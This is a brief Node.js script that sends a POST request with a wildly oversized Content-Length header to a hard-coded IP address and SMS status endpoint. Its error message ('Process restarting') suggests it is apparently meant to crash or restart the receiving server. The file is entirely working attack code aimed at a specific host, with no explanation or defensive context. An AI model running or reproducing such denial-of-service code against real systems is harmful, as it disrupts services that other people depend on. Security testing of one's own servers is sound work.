const http = require('http');

const req = http.request({
    hostname: '115.135.158.84',
    port: 2222,
    path: '/api/sms/status',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': '9999999999999999999'
    }
}, (res) => {
    console.log('STATUS:', res.statusCode);
});

req.on('error', e => console.log('REQ ERROR (Process restarting):', e.message));
req.end();
